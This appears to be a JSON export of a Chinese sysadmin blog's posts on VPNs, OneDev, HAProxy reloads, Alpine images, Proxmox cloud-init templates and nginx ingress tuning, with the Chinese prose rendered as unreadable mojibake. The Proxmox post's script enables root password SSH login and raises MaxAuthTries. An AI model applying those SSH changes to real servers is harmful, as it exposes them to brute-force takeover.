æ”¯æŒå¤šç»„ä¸åŒçš„ vpnã€‚è¿™é‡Œå°±æ˜¯ç”¨æ¥åŒºåˆ†ä¸åŒçš„ vpn ç»„çš„ã€‚ -k èŠ‚ç‚¹ä¹‹é—´é€šè®¯æ˜¯ç”¨çš„ twofish åŠ å¯†ç®—æ³•ï¼Œè¿™é‡ŒæŒ‡å®šçš„æ˜¯å¯†é’¥ -a èŠ‚ç‚¹çš„ip -l supernodeçš„ipå’Œç«¯å£ -f æ”¾åˆ°åå° daemon æ‰§è¡Œ è¿™æ ·å°±å»ºç«‹å¥½äº†ï¼Œç³»ç»Ÿä¸­ä¼šå¤šå‡ºä¸€å¼  n2n0 çš„ç½‘å¡ã€‚\n","date":"2021-11-05","img":"","permalink":"https://rendoumi.com/posts/20211105-n2n_vpn/","series":null,"tags":null,"title":"N2nä¸€ç§peer to Peerçš„VPNçš„ä½¿ç”¨"},{"categories":null,"content":"å…¶å®ä¸€ç›´åœ¨ç”¨ githubã€gitlabã€jenkinsï¼Œä½†æ˜¯ github æ—¶ä¸æ—¶çš„æŠ½é£ï¼Œ gitlab çš„ runner å¥— Docker in docker çš„æ–¹æ³•å§”å®å¾ˆéš¾ç”¨ã€‚\næ‰€ä»¥ CI/CD è¿™ä¸€å—åå€’æŒºå–œæ¬¢é˜¿é‡Œäº‘æ•ˆè¿™ç§ç®€ä¾¿æ˜“è¡Œçš„ã€‚ä½†ç¡®å®æ‰¾ä¸åˆ°å…¶ä»–åˆé€‚ä¸”ç±»ä¼¼çš„è½¯ä»¶ã€‚\nä» V2EX ä¸Šçœ‹åˆ°ä¸€ä¸ªè€å“¥å‘çš„ onedevï¼Œæ˜¯ä¸€ä¸ªä¸€ç«™å¼çš„å¼€æºè½¯ä»¶ï¼Œè¿™ä¸å°±è¯•è¯•å…ˆ\nä»¥ centos7 ä¸ºä¾‹ï¼Œå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£… java 1.8 ç‰ˆæœ¬ 1rpm -ivh jdk-8u201-linux-x64.rpm äºŒã€å®‰è£… git é«˜ç‰ˆæœ¬ ç¼ºçœ centos7 å’Œ epel å¸¦çš„ git ç‰ˆæœ¬å¤ªä½ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå¾—åŠ ä¸ªæ–°çš„æºè£…æ–°ç‰ˆæœ¬\n1yum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm 2yum -y install git curl ä¸‰ã€å®‰è£…é…ç½® onedev https://github.com/theonedev/onedev ä¸‹è½½å‹ç¼©åŒ…ï¼Œç„¶åè§£å‹è¿è¡Œ bin/server.sh start ï¼Œå¾ˆç®€æ´ï¼Œä¸é”™ï¼\nè¿è¡Œå®Œæ‰“å¼€ http://192.168.86.101:6610 è¿›è¡Œåˆå§‹é…ç½®ï¼Œå°±ä¸¤æ­¥å°± ok äº†ã€‚\nä¸‰ã€ä¾‹å­ æˆ‘ä»¬æ˜¯è¦åœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒç”¨çš„ï¼Œæ‰€ä»¥åœ¨ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-bootï¼Œä»¥ spring-petclinic ä¸ºä¾‹ï¼š\nç„¶ååˆ°æºä»£ç ç›®å½•ä¸‹\n1git clone https://github.com/spring-projects/spring-petclinic.git 2cd spring-petclinic 3./mvnw package 4 5cd spring-petclinic 6 7git init 8git add . 9git commit -m \u0026#34;Spring boot demo project\u0026#34; 10 11git remote add origin http://192.168.86.101:6610/spring-boot 12git push --set-upstream origin master è¿™æ ·å°±å¯ä»¥åœ¨ spring-boot é‡Œçœ‹åˆ°ä»£ç äº†\nç„¶åçœ‹ä¸Šå›¾ï¼Œæœ‰ä¸ªç´«è‰²ç¯æ³¡ï¼ŒEnable build support by adding.onedev-buildspec.ymlï¼Œç‚¹é‚£ä¸ªé“¾æ¥å°±å¯ä»¥è¿›å…¥ä¸€ç³»åˆ— build ã€pushã€deploy çš„ pipeline äº†ã€‚\nå‹æƒ…æç¤ºï¼Œå•æœºçš„è¯ï¼Œæœºå™¨éœ€è¦è£… onedev çš„ agentï¼Œç„¶åè¿˜æœ‰ dockerï¼Œå°±å¯ä»¥buildäº†ã€‚ç”¨èµ·æ¥æ„Ÿè§‰è·Ÿäº‘æ•ˆå·®ä¸å¤šï¼Œå¾ˆä¸é”™ã€‚\n","date":"2021-11-05","img":"","permalink":"https://rendoumi.com/posts/20211105-onedev/","series":null,"tags":null,"title":"ä¸€ç«™å¼Gitè½¯ä»¶onedevçš„å®‰è£…ä½¿ç”¨"},{"categories":null,"content":"Nginx å¯ä»¥ç”¨ kill -HUP æ¥é‡å¯ï¼Œä¸ä¼šä¸¢å¤±å·²å»ºè¿æ¥ã€‚Haproxy å¦‚ä½•åšæ‰èƒ½åšåˆ° zero downtime æ— ç¼é‡è½½å‘¢ï¼Ÿ\nåšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€é…ç½® ç¼–è¯‘harpoxyçš„æ—¶å€™å¸¦ä¸Šå‚æ•° USE_SYSTEMDï¼Œé€‰æ‹© Haproxy 1.8 ä»¥ä¸Šç‰ˆæœ¬\n1make TARGET=linux2628 USE_GETADDRINFO=1 USE_ZLIB=1 USE_REGPARM=1 USE_OPENSSL=1 \\ 2 USE_SYSTEMD=1 USE_PCRE=1 USE_PCRE_JIT=1 USE_NS=1 3make install Haproxyæ— ç¼é‡è½½æŠ€æœ¯ï¼š\næ—§è¿›ç¨‹å½“å‰ç®¡ç†çš„è¿æ¥æ ¹æ® file descriptor æ–‡ä»¶æè¿°ç¬¦é€šè¿‡ socket å¥—æ¥å­—ä¼ è¾“åˆ°æ–°è¿›ç¨‹ã€‚\nåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ–‡ä»¶socketï¼ˆunix socketï¼‰çš„è¿æ¥æ²¡æœ‰æ–­å¼€ã€‚\næ–°è¿›ç¨‹åœ¨å……å½“ master-worker ä¸»å·¥ä½œè€…çš„åŒæ—¶æ‰§è¡Œæ­¤ä»»åŠ¡ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡ä½¿ç”¨unix socketæ¥ç»´æŠ¤è¿æ¥çŠ¶æ€å¹¶åœ¨æ—§è¿›ç¨‹å’Œæ–°è¿›ç¨‹ä¹‹é—´ä¼ é€’ï¼Œé˜²æ­¢äº†è¿æ¥ä¸¢å¤±ã€‚\nhaproxy çš„è¿è¡Œä½¿ç”¨ Systemd é‡è½½ï¼Œä½¿ç”¨ -Ws æ–¹å¼ã€‚ ï¼ˆæ­¤å¤–ï¼Œåœ¨æ„å»ºæ—¶å¿…é¡»å¯ç”¨ USE_SYSTEMDï¼‰\n1 -D : start as a daemon. The process detaches from the current terminal after 2 forking, and errors are not reported anymore in the terminal. It is 3 equivalent to the \u0026#34;daemon\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the 4 configuration. It is recommended to always force it in any init script so 5 that a faulty configuration doesn\u0026#39;t prevent the system from booting. 6 7 -W : master-worker mode. It is equivalent to the \u0026#34;master-worker\u0026#34; keyword in 8 the \u0026#34;global\u0026#34; section of the configuration. This mode will launch a \u0026#34;master\u0026#34; 9 which will monitor the \u0026#34;workers\u0026#34;. Using this mode, you can reload HAProxy 10 directly by sending a SIGUSR2 signal to the master. The master-worker mode 11 is compatible either with the foreground or daemon mode. It is 12 recommended to use this mode with multiprocess and systemd. 13 14 -Ws : master-worker mode with support of `notify` type of systemd service. 15 This option is only available when HAProxy was built with `USE_SYSTEMD` 16 build option enabled. å…·ä½“çš„å¯åŠ¨è„šæœ¬ï¼š/etc/systemd/system/haproxy.service\n1[Unit] 2Description=HAProxy Load Balancer 3After=network-online.target 4Wants=network-online.target 5 6[Service] 7Environment=\u0026#34;CONFIG=/etc/haproxy/haproxy.cfg\u0026#34; \u0026#34;PIDFILE=/run/haproxy.pid\u0026#34; 8ExecStartPre=/usr/sbin/haproxy -f $CONFIG -c -q 9ExecStart=/usr/sbin/haproxy -Ws -f $CONFIG -p $PIDFILE 10ExecReload=/usr/sbin/haproxy -f $CONFIG -c -q 11ExecReload=/bin/kill -USR2 $MAINPID 12KillMode=mixed 13Restart=always 14SuccessExitStatus=143 15Type=notify 16 17# The following lines leverage SystemD\u0026#39;s sandboxing options to provide 18# defense in depth protection at the expense of restricting some flexibility 19# in your setup (e.g. placement of your configuration files) or possibly 20# reduced performance. See systemd.service(5) and systemd.exec(5) for further 21# information. 22 23# NoNewPrivileges=true 24# ProtectHome=true 25# If you want to use \u0026#39;ProtectSystem=strict\u0026#39; you should whitelist the PIDFILE, 26# any state files and any other files written using \u0026#39;ReadWritePaths\u0026#39; or 27# \u0026#39;RuntimeDirectory\u0026#39;. 28# ProtectSystem=true 29# ProtectKernelTunables=true 30# ProtectKernelModules=true 31# ProtectControlGroups=true 32# If your SystemD version supports them, you can add: @reboot, @swap, @sync 33# SystemCallFilter=~@cpu-emulation @keyring @module @obsolete @raw-io 34 35[Install] 36WantedBy=multi-user.target äºŒã€éªŒè¯ éªŒè¯æ˜¯å¦çœŸçš„æ˜¯æ— ç¼é‡è½½çš„æ­¥éª¤å¦‚ä¸‹ï¼š\nåœ¨haproxy.cfgçš„globalæ®µè½ä¸­åŠ å…¥statçš„é…ç½®ï¼š\n1stats socket /var/run/haproxy.sock level admin expose-fd listeners process 1 è¿è¡Œä¸€ä¸ªä¸æ–­å¾ªç¯é‡å¯çš„è„šæœ¬ï¼š\n1while true ; do systemctl reload haproxy ; sleep 3 ; done ç”¨ apache çš„å‹æµ‹å·¥å…· ab æ¥å‹ä¸€ä¸‹ã€‚\nSend request while service is reloading:\n1ab -r -c 20 -n 100000 http://127.0.0.1/ æœ€åæ£€æŸ¥ç»“æœä¸­ \u0026ldquo;Failed requests\u0026rdquo; æ˜¯å¦ä¸ºé›¶å°±å¯ä»¥äº†\n","date":"2021-11-04","img":"","permalink":"https://rendoumi.com/posts/20211104-haproxy_restart/","series":null,"tags":null,"title":"Haproxyçš„Zero Downtimeé‡å¯å¦‚ä½•åš"},{"categories":null,"content":"ç”¨ alphine é•œåƒçš„ä¸€äº›å¸¸ç”¨æŠ€å·§ï¼š\nä¼šéšæ—¶å¢åŠ ï¼š\nä¸€ã€ä¿®æ”¹æºï¼Œç”¨å›½å¤–çš„æºéå¸¸æ…¢ï¼Œæ›¿æ¢æˆå›½å†…çš„ä¸­ç§‘å¤§æº 1sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39; /etc/apk/repositories äºŒã€æ›´æ–°apkåº“ 1apk update ä¸‰ã€å®‰è£…è½¯ä»¶ 1#å®‰è£…telnet 2apk add busybox-extras 3 4#å®‰è£…curl 5apk add curl 6 7#å®‰è£…æ—¶é—´ç»„ä»¶ 8apk add tzdata 9 10#æ›´æ–°å¹¶ä¸”å®‰è£…è½¯ä»¶ 11apk add --update tzdata å››ã€è¿›å…¥å®¹å™¨ä¸€æ­¥æ‰§è¡Œæ¢æºã€æ›´æ–°ã€å®‰è£… 1sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39; /etc/apk/repositories \u0026amp;\u0026amp; apk update \u0026amp;\u0026amp; apk add curl \u0026amp;\u0026amp; apk add busybox-extras äº”ã€è§£å†³ç¼ºå°‘glibcåº“çš„é—®é¢˜ å¦‚æœä¸lnä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯ç¼ºå°‘glibcåº“ï¼ï¼ï¼è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\n1RUN mkdir /lib64 \u0026amp;\u0026amp; \\ 2 ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2 å…­ã€ä¸€äº›è°ƒè¯•çš„CMD 1CMD [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;] 2 3kubectl run curlpod --image=radial/busyboxplus:curl --command -- /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; ä¸ƒã€podçš„ç­‰å¾…æŠ€å·§ è¿™å„¿é‡Œå¯åŠ¨æ­£å¼çš„podä¹‹å‰ï¼Œå…ˆä¸´æ—¶èµ·äº†ä¸¤ä¸ªå®¹å™¨ç­‰å¾…å…¶ä»–æœåŠ¡çš„å®Œæˆ\n1 containers: 2 - name: myapp-container 3 image: busybox 4 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo The app is running! \u0026amp;\u0026amp; sleep 3600\u0026#39;] 5 initContainers: 6 - name: init-myservice 7 image: busybox 8 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup myservice; do echo waiting for myservice; sleep 2; done;\u0026#39;] 9 - name: init-mydb 10 image: busybox 11 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup mydb; do echo waiting for mydb; sleep 2; done;\u0026#39;] ","date":"2021-11-04","img":"","permalink":"https://rendoumi.com/posts/20211104-alphine_usage/","series":null,"tags":null,"title":"Alphineé•œåƒçš„ä½¿ç”¨æŠ€å·§"},{"categories":null,"content":"æˆ‘ä»¬éƒ½å–œæ¬¢ç”¨ alphine çš„é•œåƒåšåº•åŒ…ï¼Œæ¥ç”Ÿäº§è‡ªå·±çš„é•œåƒ\nalphine çš„åº•åŒ…çš„æ—¶é—´è®¾å®šå°±éå¸¸é‡è¦äº†\nç›´æ¥ç»™å‡º Dockerfile\n1FROM alpine:3.12 2 3# latest certs 4RUN apk add ca-certificates --no-cache \u0026amp;\u0026amp; update-ca-certificates 5 6# timezone support 7ENV TZ=Asia/Shanghai 8RUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\ 9 cp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\ 10 echo $TZ \u0026gt; /etc/timezone 11 12# install chrony and place default conf which can be overridden with volume 13RUN apk add --no-cache chrony \u0026amp;\u0026amp; mkdir -p /etc/chrony 14COPY chrony.conf /etc/chrony/. 15 16# port exposed 17EXPOSE 123/udp 18 19# start 20CMD [ \u0026#34;/usr/sbin/chronyd\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;-s\u0026#34;] æ—¶é—´è®¾å®šé‡è¦çš„å°±æ˜¯ä¸‹é¢è¿™å‡ è¡Œ\n1# timezone support 2ENV TZ=Asia/Shanghai 3RUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\ 4 cp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\ 5 echo $TZ \u0026gt; /etc/timezone è¿˜æœ‰å¦‚æœåœ¨ image: maven:3.5-jdk-8-alpine è¿™ç§é•œåƒé‡Œï¼Œæ— è®ºæ€ä¹ˆæ”¹æ—¶é—´éƒ½ä¸æ˜¯ä¸œå…«åŒºï¼Œå¯ä»¥è¯•è¯•ä¸‹é¢çš„å‘½ä»¤ï¼š\n1export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) ","date":"2021-11-03","img":"","permalink":"https://rendoumi.com/posts/20211103-alphine_timezone/","series":null,"tags":null,"title":"Alphineé•œåƒä¸­timezoneçš„è®¾å®š"},{"categories":null,"content":"å…¶å®æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒä¸€ç›´æ˜¯ KVM ï¼Œç„¶åç”¨ shell è„šæœ¬æ§åˆ¶è™šæœºçš„ç”Ÿæˆï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº† Cloud-init çš„æ ‡å‡†é•œåƒã€‚\nå¬è¯´ Proxmox ä¹Ÿå¾ˆä¸é”™ï¼Œäºæ˜¯æƒ³çœ‹çœ‹èƒ½å¦ä¹Ÿåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ä¸Š\nå¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ï¼Œå¿…é¡»è¦è®© proxmox æ”¯æŒ cloud-init ï¼Œå¦åˆ™æ— æ„ä¹‰ï¼Œä¸‹é¢ä¹Ÿè¯´ä¸€ä¸‹è·‘åœ¨ç”Ÿäº§çš„æ³¨æ„äº‹é¡¹\né¦–å…ˆæˆ‘ä»¬ç”¨å…‰ç›˜å®‰è£…ï¼š\nç„¶åç¬¬ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯ç¡¬ç›˜ï¼Œé€‰ Options åï¼š\nä¼šå†’å‡ºä¸€å †é€‰é¡¹ï¼Œå…¬å¸çš„ç”Ÿäº§ç¯å¢ƒï¼ŒæœåŠ¡å™¨å¦‚æœæ²¡æœ‰ raid å¡æ˜¯å¾ˆå¥‡æ€ªçš„ï¼Œæ‰€ä»¥ zfs åè€Œä¸æ˜¯æ ‡é…ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šäº‹å…ˆåœ¨ raid å¡ä¸Šåˆ’åˆ†å¥½ç¡¬ç›˜ï¼Œç”Ÿäº§ç¯å¢ƒåŸºæœ¬å¿…ç„¶æ˜¯ raid10 ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ ext4 å’Œ xfs äºŒé€‰ä¸€äº†ï¼Œå…«æˆ’é€‰ ext4 ï¼Œå› ä¸ºåäº†å¥½ä¿®ç†ï¼Œxfs_repair ç”¨èµ·æ¥ç›¸å½“é¾Ÿæ¯›ï¼š\né‚£ä¹ˆï¼Œé€‰å®šäº† ext4 ï¼Œæ¥ä¸‹æ¥å°±æ¯”è¾ƒé‡è¦äº†\nhdsize 1116.0 ï¼Œå•ä½æ˜¯Gï¼Œè¿™ä¸ªæ˜¯è‡ªåŠ¨æ”¶é›†ä¸Šæ¥çš„ï¼Œä¸ç”¨æ”¹\nswapsizeï¼Œäº¤æ¢åˆ†åŒºå¤§å°ï¼Œè¿™ä¸ªç»™ 8 Gï¼ˆæœ€å¤§8Gï¼‰\nmaxrootï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œå­˜æ”¾ iso å’Œ template çš„ï¼Œéœ€è¦ç»™å¤Ÿï¼Œ100 G\nminfreeï¼Œç¬¬ä¸€ä¸ªåˆ†åŒºæœ€å°ç•™å¤šå¤§ï¼Œç»™ 10 Gï¼ˆç¼ºçœ16Gï¼‰\nmaxvzï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬äºŒä¸ªåˆ†åŒºï¼Œå­˜æ”¾å®é™…çš„è™šæœºæ–‡ä»¶ï¼Œå…¨éƒ½ç”¨ä¸Šï¼Œä»€ä¹ˆä¹Ÿä¸å¡«å†™\nç„¶åç»§ç»­ï¼Œå›½å®¶é€‰ chinaï¼ŒHostname å¡«å†™ proxmox-168-86-103.localï¼Œå†å¡«å†™å¥½å…¶ä»–ä¿¡æ¯ï¼Œå°±å®‰è£…æˆåŠŸäº†ã€‚\næ‰“å¼€ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ª localï¼Œ100Gï¼Œå¯¹åº”ä¸Šé¢çš„ maxroot\nç„¶å local-lvm ï¼Œå°±æ˜¯å‰©ä½™æ”¾è™šæœºçš„ç©ºé—´\nsshç™»å½•ç³»ç»Ÿï¼Œé¦–å…ˆæ¢æˆä¸­ç§‘å¤§çš„ apt æºï¼Œå¹¶å‡çº§ä¸€ä¸‹ç³»ç»Ÿï¼š\n1sed -i \u0026#39;s|^deb http://ftp.debian.org|deb https://mirrors.ustc.edu.cn|g\u0026#39; /etc/apt/sources.list 2sed -i \u0026#39;s|^deb http://security.debian.org|deb https://mirrors.ustc.edu.cn/debian-security|g\u0026#39; /etc/apt/sources.list 3CODENAME=`cat /etc/os-release |grep CODENAME |cut -f 2 -d \u0026#34;=\u0026#34;` 4echo \u0026#34;deb https://mirrors.ustc.edu.cn/proxmox/debian $CODENAME pve-no-subscription\u0026#34; \u0026gt; /etc/apt/sources.list.d/pve-no-subscription.list 5cat /etc/apt/sources.list.d/pve-no-subscription.list 6rm /etc/apt/sources.list.d/pve-enterprise.list 7apt update 8apt upgrade é‚£ç”Ÿäº§ä½¿ç”¨ï¼Œæ˜¯å¿…é¡»ç”¨ Cloud-init çš„æ ‡å‡†åŒ–é•œåƒçš„ã€‚æˆ‘ä»¬éœ€è¦é€ å‡ºä¸€ä¸ª template ã€‚\nä»¥ Centos7 ä¸ºä¾‹å­\n1wget http://cloud.centos.org/centos/7/images/CentOS-7-x86_64-GenericCloud.qcow2 2apt-get install libguestfs-tools ç„¶åå‡†å¤‡è„šæœ¬ modify.sh ï¼š\n1#!/bin/sh 2image_name=CentOS-7-x86_64-GenericCloud.qcow2 3# virt-edit -a ${image_name} /etc/cloud/cloud.cfg 4virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/disable_root: [Tt]rue/disable_root: False/\u0026#39; 5virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/disable_root: 1/disable_root: 0/\u0026#39; 6virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/lock_passwd: [Tt]rue/lock_passwd: False/\u0026#39; 7virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/lock_passwd: 1/lock_passwd: 0/\u0026#39; 8virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/ssh_pwauth: 0/ssh_pwauth: 1/\u0026#39; 9virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/PasswordAuthentication no/PasswordAuthentication yes/\u0026#39; 10virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/PermitRootLogin [Nn]o/PermitRootLogin yes/\u0026#39; 11virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/#PermitRootLogin [Yy]es/PermitRootLogin yes/\u0026#39; 12virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/\u0026#39; 13virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/[#M]axAuthTries 6/MaxAuthTries 20/\u0026#39; 14virt-customize --install cloud-init,atop,htop,nano,vim,qemu-guest-agent,curl,wget,telnet,lsof,screen -a ${image_name} è¿è¡Œå®ƒï¼Œä»¥ä¸Šå‘½ä»¤å…¶å®æ˜¯ä¾µå…¥é•œåƒï¼Œä¿®æ”¹ sshd_config å…è®¸ root ç”¨ password ç™»å½•ï¼Œç„¶ååˆå®‰äº†å‡ ä¸ªå¸¸ç”¨è½¯ä»¶ï¼Œå¤§å®¶å¯ä»¥æŒ‰éœ€ä¿®æ”¹ã€‚\næœ€åç”Ÿæˆ template , è„šæœ¬ï¼š vm.sh 1#!/bin/sh 2vm_id=9999 3image_name=CentOS-7-x86_64-GenericCloud.qcow2 4 5qm create ${vm_id} --memory 8196 --net0 virtio,bridge=vmbr0 6qm importdisk ${vm_id} ${image_name} local-lvm 7qm set ${vm_id} --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-${vm_id}-disk-0 8qm set ${vm_id} --ide2 local-lvm:cloudinit 9qm set ${vm_id} --boot c --bootdisk scsi0 10qm set ${vm_id} --serial0 socket --vga serial0 11qm template ${vm_id} cloud-init æŠ€æœ¯çš„æ ¸å¿ƒå…¶å®å°±æ˜¯ç”¨é…ç½®æ–‡ä»¶ï¼Œåœ¨è™šæœºå¯åŠ¨çš„æ—¶å€™åŠ¨æ€ä¿®æ”¹ï¼Œè¿™é‡ŒæŠŠé…ç½®æ”¾åˆ°äº† ide2 çš„ä¸€ä¸ªè™šæ‹Ÿ cdrom ä¸­\næœ€ç»ˆä¼šç”Ÿæˆä¸€ä¸ª id ä¸º 9999 çš„ template\næˆ‘ä»¬è¿˜éœ€è¦æ”¹ä¸¤å¤„ï¼š\nä¸€æ˜¯ CPUã€MEMORYã€ç¡¬ç›˜å¤§å°ï¼Œç¼ºçœæ˜¯ 8Gï¼Œæˆ‘ä»¬ç”Ÿäº§çš„é•œåƒæ ‡é…æ˜¯80Gï¼Œéœ€è¦ resize , åŠ  72Gï¼Œåˆè®¡80G\näºŒæ˜¯ cloud-init éƒ¨åˆ†ï¼Œç”¨æˆ·åã€å¯†ç ã€DNSã€IPã€MASKã€GATEWAY\nè¿™æ ·è¿™ä¸ª template å°±åšå¥½äº†ï¼Œåœ¨ç”Ÿäº§çš„æ—¶å€™ï¼Œåªéœ€è¦ clone è¿™ä¸ªæ¨¡æ¿ï¼ˆæ¨¡å¼è¦é€‰ Full Cloneï¼‰ï¼Œç„¶åè®°å¾—ä¿®æ”¹ä¸ºä¸åŒçš„IPï¼Œå°±å¯ä»¥äº†ã€‚\næ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªä¸œè¥¿åå°ç™½ï¼Œå¯¹äºä¹ æƒ¯äº† KVM çš„äººæ¥è¯´ï¼Œåè€Œä¸å¦‚è„šæœ¬æ¥çš„å¿«ã€‚\nç›¸å…³æ–‡æ¡£ï¼šhttps://whattheserver.com/proxmox-cloud-init-os-template-creation/\n","date":"2021-11-03","img":"","permalink":"https://rendoumi.com/posts/20211103-proxmox/","series":null,"tags":null,"title":"ç”Ÿäº§ç¯å¢ƒProxmox 7.02çš„å®‰è£…å’Œé…ç½®"},{"categories":null,"content":"kubernetes ä¸­ nginx ingress çš„ä¼˜åŒ–åˆ†ä¸¤éƒ¨åˆ†\nä¸€ã€ç³»ç»Ÿsysctléƒ¨åˆ†ä¼˜åŒ– é¦–å…ˆæ˜¯å¯¹nginxå¯åŠ¨å‰çš„ç³»ç»Ÿæ€§èƒ½è¿›è¡Œä¼˜åŒ–ï¼Œè¿™éƒ¨åˆ†è°ƒæ•´ç½‘ç»œçš„ç¼“å†²åŒºï¼Œå‡å°é—²ç½® socket å…³é—­çš„æ—¶é—´\nä»¥é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ deployments çš„ nginx-ingress-controller\n1 initContainers: 2 - command: 3 - /bin/sh 4 - -c 5 - | 6 mount -o remount rw /proc/sys 7 sysctl -w net.core.somaxconn=65535 8 sysctl -w net.ipv4.ip_local_port_range=\u0026#34;1024 65535\u0026#34; 9 sysctl -w net.ipv4.tcp_tw_reuse=1 10 sysctl -w fs.file-max=1048576 11 sysctl -w net.ipv4.tcp_keepalive_time = 300 12 sysctl -w net.ipv4.tcp_keepalive_probes = 5 13 sysctl -w net.ipv4.tcp_keepalive_intvl = 15 14 äºŒã€nginx ingress å‚æ•°ä¼˜åŒ– å¤§å®¶åˆ¶åŠ¨ï¼Œnginx ingree å…¶å®æ˜¯åšä¸ºä¸€ä¸ªä¸­é—´ä»£ç†ï¼Œæ‰€ä»¥ä¸Šä¸‹æ¸¸çš„socketå‚æ•°ä¹Ÿéœ€è¦ä¼˜åŒ–\nåŒæ ·ä»¥é˜¿é‡ŒACKä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ configmaps çš„ nginx-configuration\n1apiVersion: v1 2data: 3 allow-backend-server-header: \u0026#34;true\u0026#34; 4 enable-underscores-in-headers: \u0026#34;true\u0026#34; 5 generate-request-id: \u0026#34;true\u0026#34; 6 ignore-invalid-headers: \u0026#34;true\u0026#34; 7 log-format-upstream: $remote_addr - [$remote_addr] - $remote_user [$time_local] 8 \u0026#34;$request\u0026#34; $status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#34;$http_user_agent\u0026#34; $request_length 9 $request_time [$proxy_upstream_name] $upstream_addr $upstream_response_length 10 $upstream_response_time $upstream_status $req_id $host [$proxy_alternative_upstream_name] 11 proxy-body-size: 20m 12 proxy-connect-timeout: \u0026#34;10\u0026#34; 13 reuse-port: \u0026#34;true\u0026#34; 14 server-tokens: \u0026#34;false\u0026#34; 15 ssl-redirect: \u0026#34;false\u0026#34; 16 17 upstream-keepalive-timeout: \u0026#34;900\u0026#34; 18 keep-alive-requests: \u0026#34;10000\u0026#34; 19 upstream-keepalive-connections: \u0026#34;500\u0026#34; 20 max-worker-connections: \u0026#34;65536\u0026#34; 21 22 worker-cpu-affinity: auto 23kind: ConfigMap ","date":"2021-11-02","img":"","permalink":"https://rendoumi.com/posts/20211102-ingress_nginx/","series":null,"tags":null,"title":"K8sä¸­nginx Ingressçš„æ€§èƒ½ä¼˜åŒ–"},{"categories":null,"content":"è¿™ç¯‡æ˜¯çº¯é…ç½®ç¯‡ï¼Œè§£é‡Šéƒ½åœ¨é…ç½®é‡Œäº†ï¼Œæ˜¯ç”Ÿäº§æœåŠ¡å™¨ sysctl.conf çš„é…ç½®\n1### KERNEL ### 2 3# Reboot after 10sec. on kernel panic 4kernel.panic = 10 5 6### IMPROVE SYSTEM MEMORY MANAGEMENT ### 7 8# Increase size of file handles and inode cache 9fs.file-max = 2097152 10 11# Insure we always have enough memory 12vm.min_free_kbytes = 8192 13 14# Do less swapping 15vm.swappiness = 10 16vm.dirty_ratio = 10 17vm.dirty_background_ratio = 2 18 19 20### GENERAL NETWORK SECURITY OPTIONS ### 21 22# Avoid a smurf attack 23net.ipv4.icmp_echo_ignore_broadcasts = 1 24 25# Turn on protection for bad icmp error messages 26net.ipv4.icmp_ignore_bogus_error_responses = 1 27 28# Turn on syncookies for SYN flood attack protection 29net.ipv4.tcp_syncookies = 1 30net.ipv4.tcp_max_syn_backlog = 8192 31 32 33# Turn on timestamping 34net.ipv4.tcp_timestamps = 1 35 36# Turn on and log spoofed, source routed, and redirect packets 37net.ipv4.conf.all.log_martians = 1 38net.ipv4.conf.default.log_martians = 1 39 40# No source routed packets here 41net.ipv4.conf.all.accept_source_route = 